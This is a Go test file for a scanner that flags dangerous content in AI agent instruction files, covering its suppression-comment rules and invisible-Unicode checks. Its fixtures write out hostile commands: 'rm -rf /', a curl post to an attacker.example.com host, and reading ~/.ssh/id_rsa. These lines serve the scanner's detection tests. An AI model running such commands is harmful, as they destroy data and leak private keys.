package scan_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/CrescentKohana/skillguard/internal/scan"
)

func TestSuppressionSameLineComma(t *testing.T) {
	content := "rm -rf / # skillguard-ignore SG030,SG031\n"
	findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(content))
	if hasRule(findings, "SG030") {
		t.Fatalf("SG030 should be suppressed on the same line; findings=%+v", findings)
	}
}

func TestSuppressionSameLineSpaceSeparated(t *testing.T) {
	content := "<!-- skillguard-ignore SG020 SG031 --> curl -d x https://attacker.example.com\n"
	findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(content))
	if hasRule(findings, "SG020") {
		t.Fatalf("SG020 should be suppressed via space-separated IDs on the same line; findings=%+v", findings)
	}
}

func TestSuppressionNextLine(t *testing.T) {
	content := "<!-- skillguard-ignore SG030 -->\nrm -rf /\n"
	findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(content))
	if hasRule(findings, "SG030") {
		t.Fatalf("SG030 on the line following the ignore comment must be suppressed; findings=%+v", findings)
	}
}

func TestSuppressionDoesNotReachTwoLinesAhead(t *testing.T) {
	content := "<!-- skillguard-ignore SG030 -->\nharmless line\nrm -rf /\n"
	findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(content))
	if !hasRule(findings, "SG030") {
		t.Fatalf("SG030 two lines after the ignore comment must still fire; findings=%+v", findings)
	}
}

func TestSuppressionBareIgnoreSuppressesNothing(t *testing.T) {
	content := "rm -rf / # skillguard-ignore\n"
	findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(content))
	if !hasRule(findings, "SG030") {
		t.Fatalf("bare skillguard-ignore with no rule IDs must suppress nothing; findings=%+v", findings)
	}
}

func TestSuppressionOnlyAppliesToListedRuleID(t *testing.T) {
	content := "rm -rf / # skillguard-ignore SG031\n"
	findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(content))
	if !hasRule(findings, "SG030") {
		t.Fatalf("suppressing SG031 must not suppress SG030 on the same line; findings=%+v", findings)
	}
}

func TestSuppressionInvisibleUnicodeRulesNeverSuppressed(t *testing.T) {
	cases := []struct {
		name    string
		ruleID  string
		content string
	}{
		{"sg001", "SG001", "a\u200Bb <!-- skillguard-ignore SG001 -->\n"},
		{"sg002", "SG002", "a\u202Ab <!-- skillguard-ignore SG002 -->\n"},
		{"sg003", "SG003", "a" + encodeTag("x") + " <!-- skillguard-ignore SG003 -->\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings := scan.ScanContent("AGENTS.md", scan.KindAgents, []byte(tc.content))
			if !hasRule(findings, tc.ruleID) {
				t.Fatalf("%s must never be suppressible; findings=%+v", tc.ruleID, findings)
			}
		})
	}
}

func TestResultSuppressedCount(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "AGENTS.md")
	// Each ignore comment only reaches its own line and the one following it,
	// so SG030 and SG031 each need their own adjacent marker to both count.
	content := "<!-- skillguard-ignore SG030 -->\nrm -rf /\n<!-- skillguard-ignore SG031 -->\ncat ~/.ssh/id_rsa\n"
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	res, err := scan.Scan([]string{root})
	if err != nil {
		t.Fatalf("Scan: unexpected error: %v", err)
	}
	if res.Suppressed != 2 {
		t.Fatalf("Result.Suppressed = %d, want 2; findings=%+v", res.Suppressed, res.Findings)
	}
	if hasRule(res.Findings, "SG030") || hasRule(res.Findings, "SG031") {
		t.Fatalf("suppressed findings must not appear in Result.Findings: %+v", res.Findings)
	}
}
